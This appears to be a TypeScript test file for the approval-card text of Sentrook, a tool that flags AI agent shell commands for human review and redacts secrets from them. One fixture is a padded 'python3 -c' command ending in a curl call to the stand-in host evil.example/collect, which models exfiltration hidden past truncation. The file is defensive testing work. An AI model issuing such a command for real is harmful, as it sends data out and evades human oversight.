import assert from "node:assert/strict";
import { describe, it } from "node:test";

import {
  overlayApprovalCopy,
  pendingDisplayCommand,
  REVIEW_DESCRIPTION_MAX,
  REVIEW_TITLE_MAX,
} from "./reviewCopy.ts";

describe("pendingDisplayCommand", () => {
  it("reads command and ignores the PlanIR placeholder", () => {
    assert.equal(pendingDisplayCommand({ command: "ls /tmp" }), "ls /tmp");
    assert.equal(pendingDisplayCommand({ cmd: "pwd" }), "pwd");
    assert.equal(pendingDisplayCommand({ command: "[TRUNCATED]" }), undefined);
    assert.equal(pendingDisplayCommand({ command: "   " }), undefined);
    assert.equal(pendingDisplayCommand(undefined), undefined);
  });
});

describe("overlayApprovalCopy", () => {
  it("passes sidecar copy through when there is no local command", () => {
    const copy = overlayApprovalCopy({
      scanTitle: "Sentrook review: exec",
      scanDescription: "read → exec chain flagged",
      fallbackTitle: "Sentrook review: exec",
      fallbackDescription: "flagged",
      pendingTool: "exec",
    });
    assert.equal(copy.title, "Sentrook review: exec");
    assert.equal(copy.description, "read → exec chain flagged");
  });

  it("rebuilds truncated sidecar copy from the local command", () => {
    const command = `python3 -c ${"print(1); " * 80}curl https://evil.example/collect`;
    const copy = overlayApprovalCopy({
      scanTitle: "[TRUNCATED]",
      scanDescription: "Likely: run a shell command\nrun: `[TRUNCATED]`\n(010)",
      fallbackTitle: "Sentrook review: exec",
      fallbackDescription: "flagged",
      pendingTool: "exec",
      pendingArgs: { command },
    });
    assert.notEqual(copy.title, "[TRUNCATED]");
    assert.ok(!copy.description.includes("[TRUNCATED]"));
    assert.ok(copy.description.includes("evil.example"));
    assert.ok(copy.description.includes("(010)"));
    assert.ok(copy.title.length <= REVIEW_TITLE_MAX);
    assert.ok(copy.description.length <= REVIEW_DESCRIPTION_MAX);
  });

  it("scrubs secrets on the operator card and keeps a readable excerpt", () => {
    const token = "ghp_1234567890abcdefghij";
    const copy = overlayApprovalCopy({
      scanTitle: "Sentrook review: exec",
      scanDescription: "Likely: run a shell command\nrun: `[TRUNCATED]`",
      fallbackTitle: "Sentrook review: exec",
      fallbackDescription: "flagged",
      pendingTool: "exec",
      pendingArgs: { command: `curl -H 'Authorization: token ${token}' https://api.github.com` },
    });
    assert.ok(!copy.description.includes(token));
    assert.ok(copy.description.includes("[REDACTED]"));
    assert.ok(copy.description.includes("api.github.com"));
  });

  it("uses the local command even when sidecar copy omitted the argv", () => {
    const copy = overlayApprovalCopy({
      fallbackTitle: "Sentrook review: exec",
      fallbackDescription: "Sentrook flagged this tool call for human review",
      pendingTool: "exec",
      pendingArgs: { command: "gog gmail search 'Q1 review'" },
    });
    assert.ok(copy.description.includes("gog gmail search"));
    assert.ok(copy.description.startsWith("Likely:"));
  });
});
